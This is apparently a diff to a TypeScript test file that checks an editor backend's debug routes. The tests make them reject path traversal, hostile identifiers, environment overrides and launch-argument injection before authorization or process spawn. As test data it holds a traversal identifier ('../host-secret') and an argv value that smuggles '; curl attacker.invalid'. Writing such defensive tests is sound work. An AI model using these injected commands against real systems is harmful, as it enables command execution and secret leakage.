@@ -16,7 +16,7 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { Readable } from "node:stream";
 import type { IncomingMessage, ServerResponse } from "node:http";
-import { afterEach, beforeEach, describe, expect, it } from "vitest";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import { createInMemoryEvidenceStore } from "@oscharko-dev/keiko-evidence";
 import { buildRedactor, createInMemoryUiStore } from "../index.js";
 import type { RouteContext, UiHandlerDeps } from "../index.js";
@@ -26,6 +26,17 @@ import { handleEditorInlineCompletion } from "./inlineCompletionRoutes.js";
 import { handleEditorContext, handleEditorRepoSearch } from "./contextRoutes.js";
 import { handleEditorLanguage } from "./languageRoutes.js";
 import { handleEditorTestGeneration } from "./testGenerationRoutes.js";
+import { breakpointStoreWorkspaceFingerprint } from "./dap/breakpointStore.js";
+import type { QualifiedDebugCapsuleHandle } from "./dap/dapCapsuleSupervisor.js";
+import {
+  DAP_DEBUG_ROUTE_GROUP,
+  handleStartDebugSession,
+  handleSetDebugBreakpoints,
+  type DapDebugRouteService,
+} from "./dap/dapDebugRoutes.js";
+import { createDebugActivationControlService } from "./dap/debugActivationControl.js";
+import { createDebugSessionRegistry } from "./dap/debugSessionRegistry.js";
+import { createWorkspaceMutexRegistry } from "../task-workspace/mutex.js";
 import {
   handleEditorWorkspaceReplaceApply,
   handleEditorWorkspaceReplacePreview,
@@ -55,17 +66,28 @@ function postContext(body: unknown, pathname: string): RouteContext {
 }
 
 function deps(env: Record<string, string | undefined> = {}): UiHandlerDeps {
+  const dapDebug = {
+    manager: {
+      binding: () => undefined,
+      health: () => undefined,
+      workspaceSessionId: () => undefined,
+      boundSessionId: () => undefined,
+    },
+    browserSessions: { authorize: () => ({ ok: false, reason: "malformed" }) },
+  } as unknown as DapDebugRouteService;
   return {
     store,
     redactor: buildRedactor(env, undefined),
     evidenceStore: createInMemoryEvidenceStore(),
     env,
+    ...(env.KEIKO_EDITOR_DEBUG === "1" ? { dapDebug } : {}),
   } as unknown as UiHandlerDeps;
 }
 
 const TEST_GENERATION_ENABLED: Record<string, string | undefined> = {
   KEIKO_EDITOR_TEST_GENERATION: "on",
 };
+const DEBUG_ENABLED: Record<string, string | undefined> = { KEIKO_EDITOR_DEBUG: "1" };
 
 interface ExpectedRejection {
   readonly status: number;
@@ -89,6 +111,48 @@ const CONTAINMENT_FIRST: Readonly<Record<string, ExpectedRejection>> = {
 
 // One entry per editor BFF route that accepts a caller-supplied workspace path.
 const PATH_ACCEPTING_ROUTES: readonly PathAcceptingRoute[] = [
+  {
+    name: "POST /api/editor/debug/sessions",
+    path: "/api/editor/debug/sessions",
+    handler: handleStartDebugSession,
+    env: DEBUG_ENABLED,
+    bodyForPath: (p) => ({
+      schemaVersion: "1",
+      workspaceId: breakpointStoreWorkspaceFingerprint(root),
+      target: { kind: "file", fileId: p },
+      activationRevision: 0,
+    }),
+    expected: {
+      denied: { status: 403, code: "DENIED" },
+      escape: { status: 400, code: "INVALID_REQUEST" },
+    },
+  },
+  {
+    name: "PUT /api/editor/debug/breakpoints",
+    path: "/api/editor/debug/breakpoints",
+    handler: handleSetDebugBreakpoints,
+    env: DEBUG_ENABLED,
+    bodyForPath: (p) => ({
+      schemaVersion: "1",
+      workspaceId: breakpointStoreWorkspaceFingerprint(root),
+      expectedRevision: 0,
+      fileId: p,
+      breakpoints: [
+        {
+          id: "boundary_breakpoint",
+          fileId: p,
+          line: 1,
+          enabled: true,
+          kind: "line",
+          verification: "pending",
+        },
+      ],
+    }),
+    expected: {
+      denied: { status: 403, code: "DENIED" },
+      escape: { status: 400, code: "INVALID_REQUEST" },
+    },
+  },
   {
     name: "POST /api/editor/completion",
     path: "/api/editor/completion",
@@ -239,6 +303,164 @@ const MALICIOUS_PATHS: readonly {
   { key: "escape", label: "an out-of-root traversal path", path: "../escape.ts" },
 ];
 
+interface DebugBoundaryCase {
+  readonly method: string;
+  readonly pattern: string;
+  readonly pathname: string;
+  readonly body: unknown;
+  readonly params?: Readonly<Record<string, string>> | undefined;
+}
+
+const HOSTILE_ID = "../host-secret";
+const DEBUG_BOUNDARY_CASES: readonly DebugBoundaryCase[] = [
+  {
+    method: "POST",
+    pattern: "/api/editor/debug/bootstrap",
+    pathname: "/api/editor/debug/bootstrap",
+    body: { schemaVersion: "1", workspaceId: HOSTILE_ID },
+  },
+  {
+    method: "POST",
+    pattern: "/api/editor/debug/sessions",
+    pathname: "/api/editor/debug/sessions",
+    body: { schemaVersion: "1", workspaceId: HOSTILE_ID },
+  },
+  {
+    method: "GET",
+    pattern: "/api/editor/debug/sessions/:sessionId",
+    pathname: "/api/editor/debug/sessions/hostile",
+    params: { sessionId: HOSTILE_ID },
+    body: {},
+  },
+  {
+    method: "DELETE",
+    pattern: "/api/editor/debug/sessions/:sessionId",
+    pathname: "/api/editor/debug/sessions/hostile",
+    params: { sessionId: HOSTILE_ID },
+    body: {},
+  },
+  {
+    method: "POST",
+    pattern: "/api/editor/debug/control",
+    pathname: "/api/editor/debug/control",
+    body: { schemaVersion: "1", sessionId: HOSTILE_ID },
+  },
+  {
+    method: "GET",
+    pattern: "/api/editor/debug/instrumentation",
+    pathname: `/api/editor/debug/instrumentation?workspaceId=${encodeURIComponent(HOSTILE_ID)}`,
+    body: {},
+  },
+  {
+    method: "DELETE",
+    pattern: "/api/editor/debug/instrumentation",
+    pathname: `/api/editor/debug/instrumentation?workspaceId=${encodeURIComponent(HOSTILE_ID)}&expectedRevision=0`,
+    body: {},
+  },
+  {
+    method: "PUT",
+    pattern: "/api/editor/debug/breakpoints",
+    pathname: "/api/editor/debug/breakpoints",
+    body: { schemaVersion: "1", workspaceId: HOSTILE_ID },
+  },
+  {
+    method: "PUT",
+    pattern: "/api/editor/debug/exception-breakpoints",
+    pathname: "/api/editor/debug/exception-breakpoints",
+    body: { schemaVersion: "1", workspaceId: HOSTILE_ID },
+  },
+  {
+    method: "PUT",
+    pattern: "/api/editor/debug/watches",
+    pathname: "/api/editor/debug/watches",
+    body: { schemaVersion: "1", workspaceId: HOSTILE_ID },
+  },
+  ...["stack", "scopes", "variables", "variables/set", "watches/evaluate"].map((suffix) => ({
+    method: "POST",
+    pattern: `/api/editor/debug/${suffix}`,
+    pathname: `/api/editor/debug/${suffix}`,
+    body: { schemaVersion: "1", sessionId: HOSTILE_ID },
+  })),
+  {
+    method: "GET",
+    pattern: "/api/editor/debug/events",
+    pathname: `/api/editor/debug/events?workspaceId=${encodeURIComponent(HOSTILE_ID)}`,
+    body: {},
+  },
+];
+
+function debugContext(testCase: DebugBoundaryCase): RouteContext {
+  const context = postContext(testCase.body, testCase.pathname);
+  (context.req as { method?: string }).method = testCase.method;
+  return { ...context, params: testCase.params ?? {} };
+}
+
+function emptySource(): AsyncIterable<Buffer> {
+  return {
+    [Symbol.asyncIterator]: (): AsyncIterator<Buffer> => ({
+      next: (): Promise<IteratorResult<Buffer>> =>
+        Promise.resolve({ done: true, value: undefined }),
+    }),
+  };
+}
+
+async function runningDebugSession(): Promise<{
+  readonly registry: ReturnType<typeof createDebugSessionRegistry>;
+  readonly kill: ReturnType<typeof vi.fn<(signal: NodeJS.Signals) => void>>;
+}> {
+  const registry = createDebugSessionRegistry({
+    appendEvidence: () => Promise.resolve(),
+    now: () => 0,
+    emitOutputLimit: () => undefined,
+  });
+  const kill = vi.fn<(signal: NodeJS.Signals) => void>();
+  await registry.reserve({
+    sessionId: "revoked_session",
+    workspaceId: "workspace_a",
+    workspacePartitionKey: "partition_a",
+    browserSessionBinding: "browser_a",
+    planId: "plan_a",
+    planEpoch: 1,
+    planExpiresAtMs: Number.MAX_SAFE_INTEGER,
+    targetKind: "file",
+    activationRevision: 7,
+    provisioningDigest: "a".repeat(64),
+    backend: "oci",
+    runtimeIdentityDigest: "b".repeat(64),
+    network: "none",
+    filesystem: "executionRoot",
+  });
+  const attempt = await registry.beginStartupAttempt("revoked_session");
+  let alive = true;
+  const capsule: QualifiedDebugCapsuleHandle = {
+    planId: "plan_a",
+    source: emptySource(),
+    sink: { write: () => undefined },
+    processGroup: {
+      kill: (signal): void => {
+        kill(signal);
+        alive = false;
+      },
+    },
+    exited: (): boolean => !alive,
+    inspectScope: () =>
+      Promise.resolve({
+        qualified: true,
+        backend: "oci" as const,
+        runtimeIdentityDigest: "b".repeat(64),
+        descendants: alive ? 1 : 0,
+      }),
+    terminateContainment: (): Promise<void> => Promise.resolve(),
+    cleanup: (): Promise<void> => Promise.resolve(),
+  };
+  await registry.attachCapsule("revoked_session", attempt.attemptId, capsule, {
+    backend: "oci",
+    runtimeIdentityDigest: "b".repeat(64),
+  });
+  await registry.markRunning("revoked_session", attempt.attemptId);
+  return { registry, kill };
+}
+
 beforeEach(async () => {
   root = await realpath(await mkdtemp(join(tmpdir(), "keiko-editor-security-")));
   await mkdir(join(root, "src"));
@@ -276,6 +498,134 @@ describe("editor trust boundary (#1206): path containment is uniform across ever
   it("covers every path-accepting editor route (regression guard for new routes)", () => {
     // If a new editor route accepts a workspace path, add it to PATH_ACCEPTING_ROUTES so its
     // containment is proven here too. This count is the human-maintained completeness anchor.
-    expect(PATH_ACCEPTING_ROUTES).toHaveLength(9);
+    expect(PATH_ACCEPTING_ROUTES).toHaveLength(11);
+  });
+
+  it("rejects hostile identifiers across every registered debug route without reflection", async () => {
+    expect(DEBUG_BOUNDARY_CASES).toHaveLength(16);
+    expect(
+      DEBUG_BOUNDARY_CASES.map(({ method, pattern }) => `${method} ${pattern}`).sort(),
+    ).toStrictEqual(
+      DAP_DEBUG_ROUTE_GROUP.map(({ method, pattern }) => `${method} ${pattern}`).sort(),
+    );
+    for (const testCase of DEBUG_BOUNDARY_CASES) {
+      const route = DAP_DEBUG_ROUTE_GROUP.find(
+        ({ method, pattern }) => method === testCase.method && pattern === testCase.pattern,
+      );
+      if (route === undefined) throw new Error("missing debug boundary fixture");
+      const result = await route.handler(debugContext(testCase), deps(DEBUG_ENABLED));
+      if (typeof result === "symbol") throw new Error("hostile identifier opened a stream");
+      expect(result.status).toBeGreaterThanOrEqual(400);
+      expect(result.status).toBeLessThan(500);
+      expect(JSON.stringify(result.body)).not.toContain(HOSTILE_ID);
+    }
+  });
+
+  it("rejects path containment and env-allowlist bypasses before authorization or spawn", async () => {
+    const start = vi.fn(() => Promise.resolve());
+    const authorize = vi.fn(() => ({ ok: false as const, reason: "malformed" as const }));
+    const guardedDeps = {
+      ...deps(DEBUG_ENABLED),
+      dapDebug: {
+        manager: {
+          binding: () => undefined,
+          health: () => undefined,
+          workspaceSessionId: () => undefined,
+          boundSessionId: () => undefined,
+          start,
+        },
+        browserSessions: { authorize },
+      } as unknown as DapDebugRouteService,
+    };
+    const deniedPath = await handleStartDebugSession(
+      postContext(
+        {
+          schemaVersion: "1",
+          workspaceId: breakpointStoreWorkspaceFingerprint(root),
+          target: { kind: "file", fileId: ".git/config.ts" },
+          activationRevision: 0,
+        },
+        "/api/editor/debug/sessions",
+      ),
+      guardedDeps,
+    );
+    const envBypass = await handleStartDebugSession(
+      postContext(
+        {
+          schemaVersion: "1",
+          workspaceId: breakpointStoreWorkspaceFingerprint(root),
+          target: { kind: "file", fileId: ".git/config.ts" },
+          activationRevision: 0,
+          environment: { TOKEN: "hostile" },
+        },
+        "/api/editor/debug/sessions",
+      ),
+      guardedDeps,
+    );
+
+    expect(deniedPath).toMatchObject({ status: 403, body: { error: { code: "DENIED" } } });
+    expect(envBypass).toMatchObject({ status: 400, body: { error: { code: "INVALID_REQUEST" } } });
+    expect(JSON.stringify(envBypass.body)).not.toContain("hostile");
+    expect(authorize).not.toHaveBeenCalled();
+    expect(start).not.toHaveBeenCalled();
+  });
+
+  it("rejects launch configuration injection with INVALID_REQUEST before browser authorization", async () => {
+    const start = vi.fn(() => Promise.resolve());
+    const authorize = vi.fn(() => ({ ok: false as const, reason: "malformed" as const }));
+    const guardedDeps = {
+      ...deps(DEBUG_ENABLED),
+      dapDebug: {
+        manager: {
+          binding: () => undefined,
+          health: () => undefined,
+          workspaceSessionId: () => undefined,
+          boundSessionId: () => undefined,
+          start,
+        },
+        browserSessions: { authorize },
+      } as unknown as DapDebugRouteService,
+    };
+    const body = {
+      schemaVersion: "1",
+      workspaceId: breakpointStoreWorkspaceFingerprint(root),
+      target: { kind: "file", fileId: "src/app.ts", argv: ["; curl attacker.invalid"] },
+      activationRevision: 0,
+      environment: { TOKEN: "hostile" },
+    };
+
+    const result = await handleStartDebugSession(
+      postContext(body, "/api/editor/debug/sessions"),
+      guardedDeps,
+    );
+
+    expect(result.status).toBe(400);
+    expect(result.body).toMatchObject({ error: { code: "INVALID_REQUEST" } });
+    expect(JSON.stringify(result.body)).not.toContain("hostile");
+    expect(authorize).not.toHaveBeenCalled();
+    expect(start).not.toHaveBeenCalled();
+  });
+
+  it("synchronously kills the active process group when the deployment ceiling is revoked", async () => {
+    const current = await runningDebugSession();
+    let deployment: "allowed" | "denied" = "allowed";
+    const control = createDebugActivationControlService({
+      mutex: createWorkspaceMutexRegistry(),
+      productSupport: () => "supported",
+      deploymentPolicy: () => deployment,
+      provisioning: () => "provisioned",
+      disposeActiveSession: () => current.registry.revoke("revoked_session"),
+      projectEvidence: () => undefined,
+    });
+    const context = { realRoot: root, revision: 7, workspaceActivation: "enabled" as const };
+
+    expect(control.resolve(context)).toMatchObject({ state: "available", reasonCode: "AVAILABLE" });
+    deployment = "denied";
+    await expect(
+      control.synchronize({ action: "settingsChange", changed: false, context }),
+    ).resolves.toMatchObject({ state: "disabledByPolicy", reasonCode: "POLICY_DENIED" });
+    expect(current.kill).toHaveBeenCalledExactlyOnceWith("SIGTERM");
+    expect(current.registry.session("revoked_session")).toBeUndefined();
+    control.dispose();
   });
 });
